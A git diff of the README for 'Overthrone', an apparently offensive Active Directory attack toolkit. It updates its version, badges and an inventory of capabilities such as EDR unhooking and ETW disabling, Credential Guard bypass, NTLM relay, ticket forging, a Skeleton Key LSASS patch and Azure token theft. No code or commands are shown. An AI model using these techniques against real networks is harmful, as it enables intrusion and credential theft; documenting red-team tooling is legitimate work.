@@ -12,7 +12,7 @@
 <p align="center">
   <a href="https://github.com/Karmanya03/Overthrone/releases"><img src="https://img.shields.io/github/v/release/Karmanya03/Overthrone?style=flat-square&color=cc0000" alt="release" /></a>
   <a href="https://github.com/Karmanya03/Overthrone/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-cc0000?style=flat-square" alt="license" /></a>
-  <img src="https://img.shields.io/badge/version-0.2.2--beta-cc0000?style=flat-square" alt="version" />
+  <img src="https://img.shields.io/badge/version-0.3.0--beta-cc0000?style=flat-square" alt="version" />
   <img src="https://img.shields.io/badge/written_in-Rust-cc0000?style=flat-square" alt="rust" />
   <img src="https://img.shields.io/badge/target-Active_Directory-cc0000?style=flat-square" alt="AD" />
 </p>
@@ -21,10 +21,13 @@
   <img src="https://img.shields.io/badge/enumeration-LDAP_SMB_Kerberos-blueviolet?style=flat-square" alt="protocols" />
   <img src="https://img.shields.io/badge/attack_graph-BloodHound_style-blueviolet?style=flat-square" alt="graph" />
   <img src="https://img.shields.io/badge/lateral_movement-PtH_%2B_PtT_%2B_Tickets-blueviolet?style=flat-square" alt="pth ptt" />
-  <img src="https://img.shields.io/badge/persistence-Golden_%2F_Silver_%2F_Diamond-blueviolet?style=flat-square" alt="persistence" />
+  <img src="https://img.shields.io/badge/persistence-Golden_%2F_Silver_%2F_Diamond_%2F_Sapphire-blueviolet?style=flat-square" alt="persistence" />
+  <img src="https://img.shields.io/badge/relay-HTTP_SMB_LDAP_Exchange_IPv6-blueviolet?style=flat-square" alt="relay" />
   <img src="https://img.shields.io/badge/reporting-Markdown_PDF_JSON-blueviolet?style=flat-square" alt="reports" />
   <img src="https://img.shields.io/badge/smb2-packet_signing-blueviolet?style=flat-square" alt="smb2 signing" />
   <img src="https://img.shields.io/badge/kerberos-SPNEGO_%2B_cross--domain-blueviolet?style=flat-square" alt="kerberos spnego" />
+  <img src="https://img.shields.io/badge/edr-ntdll_unhook_ETW_kill_asm!_syscall-blueviolet?style=flat-square" alt="edr" />
+  <img src="https://img.shields.io/badge/crawler-JA3_JA4_OPLOCK_Rotate_Respond-blueviolet?style=flat-square" alt="crawler" />
 </p>
 
 <p align="center">
@@ -32,9 +35,14 @@
   <img src="https://img.shields.io/badge/python-not_needed-ff4444?style=flat-square" alt="no python" />
   <img src="https://img.shields.io/badge/.NET-not_needed-ff4444?style=flat-square" alt="no dotnet" />
   <img src="https://img.shields.io/badge/wine-not_needed-ff4444?style=flat-square" alt="no wine" />
+  <img src="https://img.shields.io/badge/CredGuard_bypass-built_in-00cc66?style=flat-square" alt="credguard" />
+  <img src="https://img.shields.io/badge/DPAPI_extraction-done-00cc66?style=flat-square" alt="dpapi" />
   <img src="https://img.shields.io/badge/neo4j-not_needed-ff4444?style=flat-square" alt="no neo4j" />
   <img src="https://img.shields.io/badge/impacket-not_needed-ff4444?style=flat-square" alt="no impacket" />
+  <img src="https://img.shields.io/badge/hashcat-not_needed-ff4444?style=flat-square" alt="no hashcat" />
   <img src="https://img.shields.io/badge/binary-overthrone_or_ovt-00cc66?style=flat-square" alt="ovt shorthand" />
+  <img src="https://img.shields.io/badge/config-XDG_TOML_PROFILES-00cc66?style=flat-square" alt="config" />
+  <img src="https://img.shields.io/badge/tests-1%2C618-00cc66?style=flat-square" alt="tests" />
 </p>
 
 ***
@@ -121,7 +129,7 @@ flowchart TB
 
     subgraph UI["🎯 User Interface Layer"]
         direction TB
-        CLI["⚡ overthrone-cli<br/>• CLI Commands<br/>• TUI Dashboard<br/>• REPL Shell<br/>• Wizard Mode"]
+        CLI["⚡ overthrone-cli<br/>• CLI Commands<br/>• TUI Dashboard<br/>• REPL Shell<br/>• Wizard Mode<br/>• Config + Profiles<br/>• Session Management"]
         VIEWER["🌐 overthrone-viewer<br/>• Web GUI<br/>• D3.js Graphs<br/>• Three.js 3D<br/>• Path Finder"]
     end
 
@@ -132,8 +140,8 @@ flowchart TB
 
     subgraph RECON["🔍 Reconnaissance & Discovery"]
         direction TB
-        REAPER["📊 overthrone-reaper<br/>• LDAP Enumeration<br/>• LAPS v1/v2<br/>• GPP Decryption<br/>• ADCS Templates<br/>• BloodHound Export"]
-        CRAWLER["🕸️ overthrone-crawler<br/>• Cross-Domain Trusts<br/>• Foreign LDAP<br/>• MSSQL Links<br/>• SID Filter Analysis<br/>• PAM Detection"]
+        REAPER["📊 overthrone-reaper<br/>• LDAP Enumeration<br/>• LAPS v1/v2 + gMSA<br/>• GPP Decryption + Snaffler<br/>• ADCS Templates + NTLM→TGT<br/>• BloodHound Export + BH Edges<br/>• NTLMv1 Detection"]
+        CRAWLER["🕸️ overthrone-crawler<br/>• Cross-Domain Trusts<br/>• Foreign LDAP + OPLOCK<br/>• MSSQL Links + JA3/JA4<br/>• SID Filter Analysis<br/>• PAM Detection + Responder<br/>• TCP Source-Port Rotation"]
     end
 
     subgraph CORE["⚙️ Core Protocol Engine"]
@@ -144,12 +152,12 @@ flowchart TB
     subgraph ATTACK["⚔️ Attack & Exploitation"]
         direction TB
         HUNTER["🎯 overthrone-hunter<br/>• Kerberoasting<br/>• AS-REP Roasting<br/>• Auth Coercion<br/>• RBCD Abuse<br/>• Delegation Chains<br/>• Hash Cracking"]
-        RELAY["🔄 overthrone-relay<br/>• NTLM Relay<br/>• LLMNR/NBT-NS Poison<br/>• ADCS ESC8<br/>• Exchange Relay<br/>• SOCKS5 Proxy<br/>• LDAP Signing Bypass"]
+        RELAY["🔄 overthrone-relay<br/>• NTLM Relay + IPv6<br/>• LLMNR/NBT-NS/mDNS Poison<br/>• ADCS ESC8 + Exchange Relay<br/>• HTTP→SMB Asymmetric Relay<br/>• SOCKS5 Proxy + mTLS mode<br/>• LDAP Signing Bypass (CVE-2019-1040)<br/>• DCE/RPC Strip + Auto-Coercion"]
     end
 
     subgraph PERSIST["🔐 Persistence & Post-Ex"]
         direction TB
-        FORGE["🎭 overthrone-forge<br/>• Golden/Silver Tickets<br/>• Diamond/Sapphire Tickets<br/>• DCSync<br/>• Shadow Credentials<br/>• ACL Backdoors<br/>• Skeleton Key<br/>• S4U2Self+PKINIT"]
+        FORGE["🎭 overthrone-forge<br/>• Golden/Silver/Diamond/Sapphire<br/>• Enhanced Diamond + Bronze Bit<br/>• DCSync + ADCS Dispatcher<br/>• Shadow Credentials<br/>• ACL Backdoors + RBCD<br/>• Skeleton Key + PKINIT Paths<br/>• S4U2Self+PKINIT + AS-REP→TGT<br/>• MS-WCCE DCOM + InterRealmTgt"]
     end
 
     subgraph REPORT["📝 Reporting & Output"]
@@ -223,58 +231,64 @@ flowchart TB
 Here's what's inside the box. Every module. Every protocol. Every hilarious amount of Rust the borrow checker screamed at us about. The table below is the **complete inventory** of what each crate actually does - no marketing fluff, no "coming soon" handwaving.
 
 | Crate | Codename | What It Does | The Implementation |
-|---|---|---|---|
-| `overthrone-core` | The Absolute Unit | Protocol engine (LDAP, Kerberos, SMB, NTLM, MS-DRSR, MSSQL, DNS, Registry, PKINIT), attack graph with Dijkstra pathfinding, port scanner, full ADCS exploitation (ESC1-ESC16), crypto primitives (AES-CTS, RC4, HMAC, MD4, DPAPI, ticket crypto, GPP decryption), C2 integration (Sliver, Havoc, Cobalt Strike), plugin system (native DLL + WASM via wasmtime), remote execution (PsExec, SmbExec, WmiExec, WinRM, AtExec), interactive shell abstraction, secretsdump, RID cycling, **EDR evasion module (next-gen stealth: ntdll unhooking, ETW abolition, sleep masking, syscall resurrection), Credential Guard multi-signal remote detection (SMB registry + WMI + LDAP domain assessment), Azure AD / Entra ID hybrid attack depth (Managed Identity token theft, Entra Connect extraction, App Registration abuse, Device Code phishing)** | The absolute unit that ate the gym, then built a home gym, then ate that too. Every protocol is real - 56KB of Kerberos, 56KB of SMB, 43KB of LDAP, 50KB of secretsdump. ~64,500 lines of Rust. 1,575 lines of pure EDR evasion. The borrow checker needed therapy after this one. |
-| `overthrone-reaper` | The Collector | AD enumeration - users, groups, computers, ACLs, delegations, GPOs, OUs, SPNs, trusts, LAPS (v1 plaintext + v2 encrypted via DPAPI), GPP password decryption, MSSQL instances, ADCS template enumeration, BloodHound JSON export, CSV export | BloodHound's data collection arc but without Neo4j eating 4GB of RAM for breakfast. LAPS v2 encrypted now actually decrypts thanks to the DPAPI module finally existing. The long-awaited reunion happened. There were tears. |
-| `overthrone-hunter` | The Overachiever | Kerberoasting, AS-REP roasting, **zero-knowledge username enumeration via Kerberos AS-REQ**, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC), RBCD abuse, constrained/unconstrained delegation exploitation, ticket manipulation (.kirbi/.ccache conversion), inline hash cracking with embedded wordlist + rayon parallelism | The crate that did all its homework, extra credit, and the teacher's homework too. Zero stubs. Zero placeholders. Every attack works. This crate graduated top of its class and then helped the other crates pass their finals. |
-| `overthrone-crawler` | The Explorer | Cross-domain trust mapping, inter-realm TGT forging, SID filter analysis, PAM trust detection, MSSQL linked server crawling, **foreign trust LDAP enumeration** (users, groups, computers, SPNs, ACLs across trust boundaries), cross-domain escalation planning | Used to have 5 functions that all returned empty with "LDAP not yet implemented." Now `foreign.rs` is 25KB of real cross-trust LDAP queries. The procrastination era is over. Welcome to the productivity arc. |
-| `overthrone-forge` | The Blacksmith | Golden/Silver/Diamond ticket forging with full PAC construction, DCSync per-user extraction via MS-DRSR, Shadow Credentials (msDS-KeyCredentialLink + PKINIT auth), ACL backdoors via DACL modification, Skeleton Key orchestration via SMB/SVCCTL, DSRM backdoor via remote registry, forensic cleanup for all persistence mechanisms, ticket validation | Golden Tickets? Forged. Silver Tickets? Minted. Diamond Tickets? Polished. Shadow Credentials? Actually works now - PKINIT has real RSA signing and DH key exchange instead of "placeholder PEM structures." The chocolate key became a real key. |
-| `overthrone-pilot` | The Strategist | Autonomous attack planning from graph data, step-by-step execution with rollback, adaptive strategy based on runtime results, **Q-Learning reinforcement learning engine** (compiled by default), goal-based planning ("get DA" ? resolve path), YAML playbook engine, interactive wizard mode, full auto-pwn orchestration connecting enum ? graph ? exploit ? persist ? report, **live kill-chain pipeline visualization**, per-step Q-state/decision/reward readout, 9-section final report with credential tables and loot summaries | The "hold my beer" engine. Now with Q-Learning AI that learns which attacks work best against different environments, and actually tells you what it's doing instead of running in mysterious silence. Every step prints its stage, noise level, priority, and result. The Q-learner shows its state, which action it picked, whether it's exploring or exploiting, and the reward it got. The final report has a kill-chain completion visual, per-stage stats, credential tables, admin host lists, loot summaries, and a full audit trail. It plans, it adapts, it executes, it explains itself, it cleans up. If this crate were a person, it would be the one friend who handles your vacation AND writes a detailed trip report with expense breakdowns. |
-| `overthrone-relay` | The Interceptor | NTLM relay engine (SMB→LDAP, HTTP→SMB, mix and match), LLMNR/NBT-NS/mDNS poisoner, network poisoner with stealth controls, ADCS-specific relay (ESC8), **Exchange relay (CVE-2024-21410 with EPA bypass)**, **SMB signing awareness (pre-flight check refuses relay when signing required)**, **LDAP signing bypass (CVE-2019-1040 Drop the MIC)** | Born complete. Stayed complete. Added Exchange relay, SMB signing pre-flight, and LDAP signing bypass just to flex. ~6,600 lines, zero stubs. Responder.py walked so this crate could sprint, then it learned to fly. |
-| `overthrone-scribe` | The Chronicler | Report generation - Markdown, JSON, PDF renderer. MITRE ATT&CK mapping, mitigation recommendations, attack narrative prose, session recording | Turns "I hacked everything" into "here's why you should pay us." All three formats work. Yes, including PDF now. The scribe and the CLI finally got couples therapy. |
-| `overthrone-cli` | The Interface | CLI binary with Clap subcommands, interactive REPL shell with rustyline (command completion, history, context-aware prompts), TUI with ratatui (live attack graph visualization, local BloodHound JSON viewer, session panels, logs, crawler integration), wizard mode, doctor command, auto-pwn, C2 implant deploy, PDF/Markdown/JSON report output, banner that took way too long to make | The interactive shell alone is 107KB. The commands implementation is 78KB. Everything is wired now - PDF reports, TUI crawler, C2 implant deployment, and a zero-Neo4j graph viewer. The banner ASCII art is *chef's kiss*. |
-| `overthrone-viewer` | The Window | Browser-based graph GUI served locally. D3 force graph, node search, path finder, detail panels, and stats. No Neo4j, no external DB, no hosted web app. | When you want BloodHound vibes in a browser tab, but still want everything to stay on your machine. |
+|---|---|---|---|---|
+| `overthrone-core` | The Absolute Unit | Protocol engine (LDAP, Kerberos, SMB, NTLM, MS-DRSR, MSSQL, DNS, Registry, PKINIT), attack graph with Dijkstra pathfinding, port scanner, full ADCS exploitation (ESC1-ESC16), crypto primitives (AES-CTS, RC4, HMAC, MD4, DPAPI, ticket crypto, GPP decryption), C2 integration (Sliver, Havoc, Cobalt Strike), plugin system (native DLL + WASM via wasmtime), remote execution (PsExec, SmbExec, WmiExec, WinRM, AtExec), interactive shell abstraction, secretsdump, RID cycling, **EDR evasion (ntdll unhooking, ETW abolition, sleep masking, syscall resurrection), Credential Guard bypass (3-tier: ALPC/process-memory/WDigest), DPAPI masterkey extraction, file-format carver (docx/xlsx/etc), raw asm! syscalls with DynamicSyscallStub, SMB OPLOCK hijacking, Azure AD / Entra ID hybrid attack depth (8 ops)** | The absolute unit that ate the gym, then built a home gym, then ate that too. Every protocol is real. 761 tests. Credential Guard bypass now has 3 tiers because one wasn't enough. DPAPI extraction, file carver, and OPLOCK joined the party. The borrow checker needed therapy. Multiple sessions. |
+| `overthrone-reaper` | The Collector | AD enumeration - users, groups, computers, ACLs, delegations, GPOs, OUs, SPNs, trusts, LAPS (v1 + v2), GPP password decryption, **Snaffler module (configurable share crawling with pattern matching, 23 tests)**, **LAPS/gMSA-specific enumeration (276 lines, 12 tests)**, MSSQL instances, ADCS template enumeration, BloodHound JSON export, CSV export, **NTLM-to-TGT pipeline, NTLMv1 detection, full BH edge-type coverage (19 new variants)** | BloodHound's data collection arc but without Neo4j eating 4GB of RAM. Snaffler module audited and fixed. LAPS/gMSA purpose-built. NTLM hashes go straight to TGTs now. 202 tests. The Collector became a curator. |
+| `overthrone-hunter` | The Overachiever | Kerberoasting, AS-REP roasting, zero-knowledge username enumeration via Kerberos AS-REQ, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC), RBCD abuse, constrained/unconstrained delegation exploitation, ticket manipulation (.kirbi/.ccache conversion), inline hash cracking with embedded wordlist + rayon parallelism, **auto-crack loop, delegation chain automation (628 lines), ACL reasoning (439 lines), machine account harvesting (328 lines), smart wordlists (374 lines), NTLMv1 downgrade roast (496 lines), relay hash extraction (588 lines)** | The crate that did all its homework, extra credit, and the teacher's homework too. 76 tests. Zero stubs. Zero placeholders. Every attack works. This crate graduated top of its class, got a PhD, and came back to teach the other crates. |
+| `overthrone-crawler` | The Explorer | Cross-domain trust mapping, inter-realm TGT forging, SID filter analysis, PAM trust detection, MSSQL linked server crawling, foreign trust LDAP enumeration (users, groups, computers, SPNs, ACLs across trust boundaries), cross-domain escalation planning, **TCP source-port rotation (PortRotator, 12 tests), JA3/JA4 TLS fingerprint randomization (9 tests), SMB OPLOCK hijacking (3 tests), Responder integration (CrawlerResponder, 9 tests)** | Used to have 5 functions that all returned "not implemented." Now `foreign.rs` is 25KB of real cross-trust LDAP queries, AND the missing gaps got filled. Source-port rotation, JA3/JA4, OPLOCK, and Responder all done. 121 tests. ALL GAPS CLOSED. |
+| `overthrone-forge` | The Blacksmith | Golden/Silver/Diamond/Sapphire ticket forging with full PAC construction, Enhanced Diamond (KDC checksum preservation), Bronze Bit (CVE-2020-17049), DCSync per-user extraction via MS-DRSR, Shadow Credentials (msDS-KeyCredentialLink + PKINIT auth), ACL backdoors via DACL modification, Skeleton Key orchestration via SMB/SVCCTL/PKINIT, DSRM backdoor via remote registry, forensic cleanup, **ADCS Dispatcher (ESC1-9 orchestration, 1,147 lines, 9 tests), S4U2Self with PKINIT chain, AS-REP-to-TGT pipeline, PKINIT-keyed InterRealmTgt + SkeletonKey, MS-WCCE DCOM (30 tests)** | Golden Tickets? Forged. Silver? Minted. Diamond? Polished. Sapphire? Cut. Bronze Bit? Bent. ADCS dispatcher orchestrates ESC1-9 automatically. PKINIT-keyed everything. S4U2Self with certificates. MS-WCCE DCOM direct enrollment. 17 ForgeAction variants. 103 tests. The forge is now a factory. |
+| `overthrone-pilot` | The Strategist | Autonomous attack planning from graph data, step-by-step execution with rollback, adaptive strategy, Q-Learning RL engine (compiled by default), goal-based planning, YAML playbook engine, interactive wizard mode, full auto-pwn orchestration, live kill-chain pipeline visualization, per-step Q-state/decision/reward readout, 9-section final report, **Hostile-DC detection (dc_verify.rs, 5 checks), Session management CLI (ovt session, 7 actions, 12 tests), WizardSession::new_with_state() for skip-Enumerate resume, Coercion cred passthrough** | The "hold my beer" engine. Now with session management - list/show/info/delete/clean/path/stats. Hostile-DC detection keeps you from trusting the enemy. `new_with_state()` skips enumeration on resume. 105 tests. It plans, adapts, executes, explains itself, cleans up, and files your paperwork. |
+| `overthrone-relay` | The Interceptor | NTLM relay engine (SMB->LDAP, HTTP->SMB, mix and match), LLMNR/NBT-NS/mDNS poisoner, network poisoner with stealth controls, ADCS-specific relay (ESC8), Exchange relay (CVE-2024-21410 with EPA bypass), SMB signing awareness (pre-flight check), LDAP signing bypass (CVE-2019-1040 Drop the MIC), **HTTP->SMB asymmetric relay (360 lines, 13 tests), IPv6 transport (16 tests), mTLS/TLS verification mode (TlsVerificationMode, 22 tests), Channel binding validation (CbtMode), Auto-trigger coercion with CoerceCreds + ShadowCoerce, DCE/RPC signature stripping, SOCKS5 proxy output** | Born complete. Stayed complete. Added HTTP->SMB asymmetric relay, IPv6, mTLS verification, auto-coercion, DCE/RPC stripping, and SOCKS5 just because. 165 tests. Responder.py walked so this crate could sprint, then it learned to fly, then it built an airplane. |
+| `overthrone-scribe` | The Chronicler | Report generation - Markdown, JSON, PDF. MITRE ATT&CK mapping, mitigation recommendations, attack narrative prose, session recording, **timeline view, evidence hashing (sha256), operator attribution (OperatorMetadata), findings-population path (auto_generate_findings made pub)** | Turns "I hacked everything" into "here's why you should pay us." All three formats work. PDF renders actual content. Timeline view, evidence integrity, and operator attribution added. 54 tests. The paperwork is immaculate. |
+| `overthrone-cli` | The Interface | CLI binary with Clap subcommands, interactive REPL shell with rustyline (command completion, history, context-aware prompts, 3,263 lines), TUI with ratatui (live attack graph visualization, local BloodHound JSON viewer, session panels, logs, crawler integration), wizard mode, doctor command, auto-pwn, C2 implant deploy, PDF/Markdown/JSON report output, **Config file loading (TOML XDG-style, 1,111 lines, 39 tests), Profile system (9 subcommands, 31 tests, OT_CONFIG/OT_PROFILE env), Session management subcommand (7 actions), --dry-run, --output-format json, --downgrade-rc4 flag** | The interactive shell alone is 3,263 lines. Config system with TOML + XDG + env vars. Profile system for named configurations. Session subcommand. 6 TUI modules. Zero `unreachable!()` calls. The banner ASCII art is still *chef's kiss*. |
+| `overthrone-viewer` | The Window | Browser-based graph GUI served locally. D3.js migrated to Three.js (GPU-accelerated WebGL). Node search, path finder, detail panels with ACE/ACL guidance, stats, blank-first search/chunk render with render budgets (50-ALL). mTLS client cert support. Multi-user sessions with per-user rate limits. CSRF middleware. Auth always-on. Random credentials default. Non-loopback TLS enforcement. | When you want BloodHound vibes in a browser tab, but with GPU acceleration and no Neo4j. Three.js migration gave it superpowers. Auth, rate limits, mTLS, and CSRF make it production-safe. 31 tests. No WebSocket yet (you still have to refresh), but everything else is there. |
 
 ### The Crate Report Card
 
 These are real numbers from `cargo test --workspace --lib`. No rounding up.
 
 ```
-overthrone-core     ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~99%  64,500+ lines. ADDED: EDR evasion module (1,575 lines - ntdll
-                                                    unhooking, ETW abolition, sleep masking, syscall resurrection),
-                                                    Credential Guard multi-signal remote detection (SMB + WMI + LDAP
-                                                    domain assessment weighted voting), Azure AD depth (4 new ops:
-                                                    ManagedIdentityToken, EntraConnectExtract, AppRegistrationAbuse,
-                                                    DeviceCodePhish). Zero clippy warnings. Still growing. Still
-                                                    suspicious.
+overthrone-core     ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~99%  761 tests. EDR evasion (ntdll unhooking, ETW abolition, sleep
+                                                    masking, syscall resurrection), Credential Guard multi-signal
+                                                    detection (3-tier: ALPC/process-memory/WDigest), DPAPI extraction,
+                                                    file carver, Azure AD ops (8 total), SMB OPLOCK. Still hungry.
 
-overthrone-reaper   ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~98%  47 unit tests. DPAPI decrypts LAPS v2. Full reaper_test.rs
-                                                   integration suite (587 lines).
+overthrone-reaper   ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~99%  202 tests. Snaffler audit done (SnafflerConfig, CSV export, 23
+                                                    tests). LAPS/gMSA enumeration purpose-built (276 lines, 12 tests).
+                                                    NTLM→TGT pipeline, GPP full, BH edge coverage, NTLMv1 detection.
 
-overthrone-hunter   ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  100%  11 unit tests. 100% feature complete. The overachiever.
-                                                   hunter_test.rs integration suite (254 lines). No notes.
+overthrone-hunter   ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  100%  76 tests. All 8 modules complete. Auto-crack, delegation chains,
+                                                    ACL reasoning, machine harvesting, smart wordlists, NTLMv1 downgrade,
+                                                    relay hash extraction. The overachiever.
 
-overthrone-crawler  ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~95%  7 unit tests. foreign.rs is 25KB of real cross-trust LDAP queries.
-                                                   crawler_test.rs integration suite (203 lines).
+overthrone-crawler  ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  100%  121 tests. ALL gaps closed: TCP source-port rotation (PortRotator,
+                                                    12 tests), JA3/JA4 TLS fingerprint randomization (9 tests), SMB
+                                                    OPLOCK hijacking (3 tests), Responder integration (9 tests). 
 
-overthrone-forge    ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~96%  17 unit tests. Shadow Creds PKINIT is real RSA+DH. Diamond tickets
-                                                   work. Golden/Silver/DCSync all solid.
+overthrone-forge    ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~99%  103 tests. ADCS dispatcher (1,147 lines, ESC1-9 orchestration, 9
+                                                    tests). PKINIT-keyed golden/silver/diamond/interrealm/skeleton.
+                                                    S4U2Self with PKINIT chain. AS-REP→TGT pipeline. MS-WCCE DCOM (30
+                                                    tests). 17 ForgeAction variants.
 
-overthrone-pilot    ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~98%  8 unit tests + live DC integration suite (349 lines, gated behind
-                                                   OT_DC_HOST). 3,078-line executor. 1,051-line Q-learner. Q-learning
-                                                   compiles by default. Live kill-chain pipeline, per-step QL readout,
-                                                   9-section final report.
+overthrone-pilot    ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~99%  105 tests. Session management CLI (ovt session, 7 actions, 12
+                                                    tests). WizardSession::new_with_state() for resume. Hostile-DC
+                                                    detection (dc_verify.rs, 5 checks). Q-learner with policy/lockout
+                                                    awareness.
 
-overthrone-relay    ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  100%  6,600+ lines. ADDED: Exchange relay (CVE-2024-21410, EPA bypass),
-                                                   SMB signing awareness (pre-flight check), LDAP signing bypass
-                                                   (CVE-2019-1040 Drop the MIC). Born complete. Stayed complete.
+overthrone-relay    ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  100%  165 tests. HTTP→SMB asymmetric relay (13 tests). IPv6 transport
+                                                    (16 tests). mTLS/TLS verification mode (22 tests). Channel binding
+                                                    validation. Auto-trigger coercion with Creds passthrough +
+                                                    ShadowCoerce. Exchange relay (CVE-2024-21410, EPA bypass).
+                                                    DCE/RPC signature stripping. Born complete. Still complete.
 
-overthrone-scribe   ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~99%  13 unit tests. scribe_test.rs integration suite (314 lines). All
-                                                   three output formats work and are wired to the CLI. PDF works.
+overthrone-scribe   ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~99%  54 tests. HTML report format, timeline view, evidence hashing,
+                                                    operator attribution, findings-population path. PDF, Markdown, JSON
+                                                    all wired to CLI.
 
-overthrone-cli      ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~98%  22,500+ lines. 107KB interactive shell. TUI wired. C2 deploy
-                                                   wired. PDF wired. Azure AD CLI commands wired (Enum, SeamlessSso,
-                                                   GoldenSaml, PrtTheft). --help doesn't lie anymore.
+overthrone-cli      ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦  ~98%  6,333+ lines. Config file loading (TOML, XDG-style, 39 tests).
+                                                    Profile system (9 subcommands, 31 tests). Interactive shell REPL
+                                                    (3,263 lines, rustyline). TUI with 6 modules. Session subcommand
+                                                    (7 actions). --help doesn't lie anymore.
 ```
 
 ## What's Still Cooking (The Backlog)
@@ -292,37 +306,62 @@ The items below used to be `todo!()`. They are now real code. Some of them took 
 | **Cross-domain TGT referral** | `core/src/proto/kerberos.rs` | 2-hop referral loop in `request_tgt()`. Follows `KDC_ERR_WRONG_REALM` redirects to the right KDC via DNS SRV. Cross-forest attacks no longer require manual realm wrangling. |
 | **WmiExec Linux guard** | `core/src/exec/wmiexec.rs` | `#[cfg(not(windows))]` returns a clear error instead of silently failing or panicking. `auto_exec()` skips WmiExec entirely on Linux. Use PsExec. It's fine. |
 | **Clock skew check in `ovt doctor`** | `cli/src/commands/doctor.rs` | Anonymous LDAP bind to RootDSE, reads `currentTime`, diffs against local clock. Fails loud if drift > 5 min (Kerberos will reject you before you even start). |
-| **ADCS ESC1 + ESC6** | `core/src/adcs/esc{1,6}.rs` | Full exploiters - SAN UPN abuse, CSR, enrollment, hash extraction, EDITF flag abuse. Iron Man has joined the MCU. |
-| **LDAP signing bypass** | `relay/src/relay.rs` | CVE-2019-1040 "Drop the MIC" - strips SIGN/SEAL/ALWAYS_SIGN from CHALLENGE before victim sees it, zeroes MIC in AUTHENTICATE. Post-relay LDAP operations (add-to-group, search, modify) work on the relayed session. 7 new unit tests. The LDAP server said "please sign your messages" and we said "no." |
-| **WASM plugin system** | `core/src/plugin/loader.rs` | State persistence, manifest section parsing, `allocate()` export support, `fn_free` fallback. Your WASM plugins have long-term memory now. They remember their first day at work. |
-| **CLI PDF + C2 + TUI wiring** | `cli/src/commands_impl.rs`, `tui/runner.rs` | PDF reports, C2 implant deploy, TUI crawler - all actually call real code now. The three crates went to couples therapy. It worked. |
-| **WinRM Windows output** | `core/src/exec/winrm/windows.rs` | `WSManReceiveShellOutput` loop collects real output. Schrödinger's remote execution has been resolved. The command ran AND we know what it said. |
-| **Session resume + TOML config** | `cli/src/main.rs`, `pilot/src/runner.rs` | `--resume <file>` picks up mid-chain. `--config <file>` loads DC, domain, auth, stealth, jitter from TOML. No more repeating 14 flags every run. |
-| **Credential Vault** | `core/src/lib.rs` (`CredStore`) | Thread-safe, privilege-ranked (DA > EA > Local Admin > Service > User), surfaced in the final auto-pwn report. Knows which creds are worth more than others. |
-| **OPSEC Noise Gate** | `pilot/src/runner.rs` | `--stealth` caps the noise budget at `Medium`. High/Critical-noise steps are skipped and logged. The audit trail explains why it chickened out. |
-| **JSON output + shell completions** | `cli/src/commands_impl.rs`, `main.rs` | PDF reports, C2 implant deploy, TUI crawler - all actually call real code now. The three crates went to couples therapy. It worked. |
-| **Credential Vault** | `core/src/lib.rs` (`CredStore`) | Thread-safe, privilege-ranked (DA > EA > Local Admin > Service > User), surfaced in the final auto-pwn report. Knows which creds are worth more than others. |
-| **OPSEC Noise Gate** | `pilot/src/runner.rs` | `--stealth` caps the noise budget at `Medium`. High/Critical-noise steps are skipped and logged. The audit trail explains why it chickened out. |
-| **Skeleton Key native DLL** | `tools/skeleton_key/skeleton_key.c`, `core/src/postex/skeleton_key_dll.rs` | 92KB x64 MSVC-compiled DLL with `MsvpPasswordValidate` hook. Embedded as Rust const bytes. Reflective injection uses pre-compiled binary. Exports: `SkeletonKey_Enable`, `SkeletonKey_Disable`, `SkeletonKey_IsActive`. The LSASS patching binary that used to be "operator must compile" is now baked in. |
-| **EDR Evasion Module** | `core/src/postex/edr_bypass.rs` | 1,575-line next-gen stealth module: EDR product detection (22 vendors, process/driver/WMI), ntdll unhooking via clean mapped copy from disk, ETW provider callback abolition via `NtControlTrace`, syscall number resolution from fresh ntdll, sleep masking with XOR+rotate memory obfuscation, hook classification (JMP/CALL/INT3/PUSH-RET/detour), unified `apply_stealth_profile()` entry point. |
-| **Credential Guard Remote Detection** | `core/src/postex/cg_check.rs` | Multi-signal CG detection: SMB remote registry (`LsaCfgFlags`, `IsolatedCredentialsRootSecret`), WMI fallback via `Win32_DeviceGuard`, LDAP domain-wide assessment (DC build versions, GPO `LsaCfgFlags`), heuristic name-based fallback. Comprehensive weighted voting with confidence scoring. `choose_cred_extraction()` dynamically routes extraction technique based on CG status. Windows-2025-aware. |
-| **Azure AD / Entra ID Hybrid Operations** | `core/src/azure_ad.rs` | 4 new operations beyond the original 4: **ManagedIdentityToken** (Azure IMDS token theft), **EntraConnectExtract** (sync credential extraction via config discovery), **AppRegistrationAbuse** (LDAP enumeration of SPN/federated credential objects), **DeviceCodePhish** (OAuth device code generation + polling loop). Total 8 Azure AD attack operations. |
